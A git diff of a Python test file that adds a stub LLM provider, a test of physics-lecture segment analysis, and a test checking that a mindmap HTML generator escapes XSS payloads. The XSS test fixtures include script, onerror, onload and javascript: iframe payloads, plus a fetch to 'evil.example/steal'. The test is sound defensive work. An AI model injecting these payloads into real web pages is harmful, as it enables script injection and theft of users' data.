@@ -1,9 +1,24 @@
 """
-Tests for LLM Providers and schema parsing.
+Tests for LLM Providers, schema parsing, and HTML XSS sanitization.
 """
 
+from pathlib import Path
+from src.analysis.segment_analyzer import SegmentAnalyzer
 from src.providers.base import LLMProvider
 from src.providers.offline_mock import OfflineMockProvider
+from src.visualization.mindmap import MindmapGenerator
+
+
+class StubLLMProvider(LLMProvider):
+    """Minimal deterministic LLMProvider double that exercises the real JSON parsing pipeline."""
+
+    def __init__(self, canned_response: str) -> None:
+        self.canned_response = canned_response
+        self.calls = []
+
+    def analyze(self, prompt: str, context: str) -> str:
+        self.calls.append((prompt, context))
+        return self.canned_response
 
 
 def test_clean_and_parse_json():
@@ -20,6 +35,96 @@ def test_clean_and_parse_json():
     parsed = LLMProvider._clean_and_parse_json(raw_markdown)
     assert parsed["topic"] == "Efecto Fotoeléctrico"
     assert parsed["valid"] is True
+
+
+def test_segment_analyzer_with_stub_llm_provider():
+    raw_llm_output = """```json
+    {
+      "topics": ["Radiación de Cuerpo Negro"],
+      "key_concepts": [
+        {
+          "title": "Ley de Wien",
+          "explanation": "Desplazamiento del máximo espectral con la temperatura.",
+          "importance": "IMPRESCINDIBLE"
+        }
+      ],
+      "equations": [
+        {
+          "name": "Ley de desplazamiento de Wien",
+          "latex": "\\\\lambda_{max} T = b",
+          "variables": "T: temperatura absoluta",
+          "when_to_use": "Cuerpo negro en equilibrio térmico"
+        }
+      ],
+      "problems": []
+    }
+    ```"""
+    stub = StubLLMProvider(raw_llm_output)
+    analyzer = SegmentAnalyzer(provider=stub)
+    segments = [{"segment_id": 1, "start_min": 0.0, "end_min": 5.0, "text": "Clase sobre cuerpo negro."}]
+    analyzed = analyzer.analyze_segments(segments)
+
+    assert len(stub.calls) == 1
+    assert len(analyzed) == 1
+    assert analyzed[0]["analysis"]["topics"] == ["Radiación de Cuerpo Negro"]
+    assert analyzed[0]["analysis"]["key_concepts"][0]["title"] == "Ley de Wien"
+
+
+def test_mindmap_html_escapes_xss_payloads_and_enforces_strict_mermaid(tmp_path: Path):
+    malicious_title = 'Física <script>alert("xss-title")</script>'
+    malicious_concepts = [
+        {
+            "title": '<img src=x onerror=alert("xss-concept")>',
+            "explanation": '<script>fetch("https://evil.example/steal")</script>',
+            "importance": 'IMPRESCINDIBLE"><script>alert(1)</script>',
+        }
+    ]
+    malicious_equations = [
+        {
+            "name": 'Ecuación <script>alert("eq")</script>',
+            "latex": "E = mc^2",
+            "variables": '<svg onload=alert("vars")>',
+            "when_to_use": "Siempre",
+        }
+    ]
+    malicious_problems = [
+        {
+            "title": 'Problema <iframe src="javascript:alert(1)">',
+            "type": 'Directo',
+            "physical_phenomenon": '<script>alert("phenom")</script>',
+            "equations_used": "E = hf",
+            "general_procedure": ['Paso 1 <script>alert("step")</script>'],
+        }
+    ]
+    mermaid_code = MindmapGenerator.generate_mermaid(
+        class_title=malicious_title,
+        topics=['Tema <script>alert("topic")</script>'],
+        concepts=malicious_concepts,
+        equations=malicious_equations,
+        problems=malicious_problems,
+    )
+    out_file = tmp_path / "mapa_xss_test.html"
+    MindmapGenerator.generate_html(
+        class_title=malicious_title,
+        mermaid_code=mermaid_code,
+        synthesis={
+            "executive_summary": 'Resumen <script>alert("summary")</script>',
+            "core_concepts": malicious_concepts,
+        },
+        equations=malicious_equations,
+        problems=malicious_problems,
+        output_file=out_file,
+    )
+
+    rendered = out_file.read_text(encoding="utf-8")
+    assert '<script>alert(' not in rendered
+    assert '<img src=x onerror=' not in rendered
+    assert '<svg onload=' not in rendered
+    assert '<iframe ' not in rendered
+    assert "&lt;script&gt;alert(" in rendered
+    assert "securityLevel: 'strict'" in rendered
+    assert 'crossorigin="anonymous"' in rendered
+    assert 'integrity="sha384-' in rendered
 
 
 def test_offline_mock_provider():
